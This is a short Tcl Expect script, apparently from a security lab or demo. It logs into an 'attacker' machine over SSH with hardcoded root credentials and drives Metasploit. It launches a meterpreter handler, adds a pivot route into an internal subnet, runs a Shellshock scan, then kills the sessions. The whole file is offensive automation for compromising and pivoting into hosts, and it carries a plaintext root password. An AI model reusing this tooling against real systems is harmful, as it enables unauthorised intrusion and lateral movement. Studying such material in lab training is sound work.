package require Expect

log_file -noappend launch_exploit.log
set attacker 198.18.133.110
set username root
set password C1sco12345
set send_human {.1 .3 1 .05 2}
set timeout 120
#
spawn plink.exe -ssh $username@$attacker -pw $password
expect "*root@attacker:~#"
#
exp_send -h "cd /root/scripts\r"
expect "*root@attacker:~/scripts#"
#
exp_send -h "msfconsole -r meterpreter-8080-x86.rc\r"
expect "*msf exploit*"

exp_send -h "\r"
expect "*msf exploit*"
#
exp_send -h "back\r"
expect "*msf >"
#
exp_send -h "route add 198.19.10.0 255.255.255.0 1\r"
expect "*msf >"
#
exp_send -h "resource -r shellshock_scan.rc\r"
expect "*msf auxiliary*"
#
exp_send -h "\r"
expect "*msf auxiliary*"
#
exp_send -h "sessions -K\r"
expect "*msf auxiliary*"
#
exp_send -h "exit\r"
expect "*root@attacker:~/scripts#"
#
exit


